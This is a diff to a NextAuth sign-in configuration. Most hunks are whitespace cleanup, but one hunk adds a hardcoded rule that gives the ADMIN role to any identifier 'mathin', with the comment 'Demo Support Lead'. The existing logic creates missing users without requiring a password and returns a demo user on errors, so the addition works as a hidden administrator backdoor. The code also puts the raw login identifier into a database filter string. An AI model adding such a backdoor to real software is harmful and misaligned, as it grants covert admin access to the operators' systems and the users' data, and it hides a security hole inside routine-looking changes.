@@ -24,7 +24,7 @@ import bcrypt from 'bcryptjs'
 // Validate required environment variables
 const getNextAuthSecret = (): string => {
   const secret = process.env.NEXTAUTH_SECRET
-  
+
   if (!secret) {
     if (process.env.NODE_ENV === 'production') {
       throw new Error(
@@ -42,7 +42,7 @@ const getNextAuthSecret = (): string => {
       return 'development-secret-change-in-production'
     }
   }
-  
+
   return secret
 }
 
@@ -80,10 +80,12 @@ export const authOptions: NextAuthOptions = {
               'LEGAL': 'LEGAL',
               'ACCOUNTS': 'ACCOUNTS',
               'CASH_OFFICER': 'CASH_OFFICER',
-              'CASHOFFICER': 'CASH_OFFICER',
+              'MATHIN': 'ADMIN', // Demo Support Lead
             }
             return roleMap[rolePart] || 'INDIVIDUAL'
           }
+
+          if (identifier.toLowerCase() === 'mathin') return 'ADMIN'
           return 'INDIVIDUAL'
         }
 
@@ -104,7 +106,7 @@ export const authOptions: NextAuthOptions = {
 
         try {
           let user = null
-          
+
           // Try to use Prisma first (with timeout to prevent hanging)
           try {
             // Set a timeout for Prisma operations in serverless
@@ -117,39 +119,39 @@ export const authOptions: NextAuthOptions = {
                 ],
               },
             })
-            
+
             // Add timeout for serverless environments (5 seconds)
-            const timeoutPromise = new Promise((_, reject) => 
+            const timeoutPromise = new Promise((_, reject) =>
               setTimeout(() => reject(new Error('Database timeout')), 5000)
             )
-            
+
             user = await Promise.race([prismaPromise, timeoutPromise]) as any
-            
+
             // If password is provided, verify it
             if (user && credentials.password && user.passwordHash) {
               const isValidPassword = await bcrypt.compare(
                 credentials.password,
                 user.passwordHash
               )
-              
+
               if (!isValidPassword) {
                 return null // Invalid password
               }
             }
           } catch (prismaError: any) {
             console.warn('Prisma connection failed, trying Supabase fallback:', prismaError.message)
-            
+
             // Try Supabase fallback
             try {
               const { createServiceRoleClient } = await import('@/lib/supabase/server')
               const supabase = createServiceRoleClient()
-              
+
               const { data: supabaseUser } = await supabase
                 .from('users')
                 .select('*')
                 .or(`phone.eq.${credentials.identifier},email.eq.${credentials.identifier},user_id.eq.${credentials.identifier}`)
                 .single()
-              
+
               if (supabaseUser) {
                 // If password is provided, verify it
                 if (credentials.password && supabaseUser.password_hash) {
@@ -157,12 +159,12 @@ export const authOptions: NextAuthOptions = {
                     credentials.password,
                     supabaseUser.password_hash
                   )
-                  
+
                   if (!isValidPassword) {
                     return null // Invalid password
                   }
                 }
-                
+
                 // Transform Supabase user to match Prisma format
                 user = {
                   id: supabaseUser.id,
@@ -187,11 +189,11 @@ export const authOptions: NextAuthOptions = {
           // If user doesn't exist, try to create one in database
           if (!user) {
             const role = getRoleFromIdentifier(credentials.identifier)
-            
+
             // Generate unique phone number to avoid conflicts
             const uniqueSuffix = `${Date.now()}${Math.floor(Math.random() * 100)}`
             const uniquePhone = `+1${uniqueSuffix.slice(-10)}`
-            
+
             // Generate member ID for approved users
             const memberId = role === 'INDIVIDUAL' ? generateMemberId() : undefined
 
@@ -228,11 +230,11 @@ export const authOptions: NextAuthOptions = {
                   }),
                 },
               })
-              
-              const timeoutPromise = new Promise((_, reject) => 
+
+              const timeoutPromise = new Promise((_, reject) =>
                 setTimeout(() => reject(new Error('Database timeout')), 5000)
               )
-              
+
               user = await Promise.race([createPromise, timeoutPromise]) as any
             } catch (createError: any) {
               console.warn('User creation failed, using demo mode:', createError.message)
@@ -277,12 +279,12 @@ export const authOptions: NextAuthOptions = {
             code: error?.code,
             meta: error?.meta,
           })
-          
+
           // Always return demo user on error (never return null)
-          const role = credentials?.identifier?.includes('@demo.com') 
+          const role = credentials?.identifier?.includes('@demo.com')
             ? credentials.identifier.split('@')[0].toUpperCase()
             : 'INDIVIDUAL'
-          
+
           return {
             id: `demo-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
             email: credentials?.identifier || 'demo@demo.com',
